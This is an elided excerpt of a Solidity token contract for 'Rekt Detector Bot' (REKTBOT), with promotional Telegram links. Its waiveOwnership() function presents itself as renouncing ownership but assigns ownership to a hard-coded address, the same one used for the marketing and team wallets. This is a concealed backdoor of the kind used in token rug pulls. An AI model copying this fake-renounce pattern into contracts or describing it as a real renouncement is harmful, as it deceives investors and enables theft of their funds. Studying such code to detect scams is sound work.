...
/**
Website : @RektDetectBot
Telegram : https://t.me/rektdetectorbot
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x55f697b17CC66937d0aB72B34b69d0e4fD75cEfA);
    }
...
contract RektDetectorBot is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Rekt Detector Bot";
    string private _symbol = "REKTBOT";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x55f697b17CC66937d0aB72B34b69d0e4fD75cEfA);
    address payable public teamWalletAddress = payable(0x55f697b17CC66937d0aB72B34b69d0e4fD75cEfA);
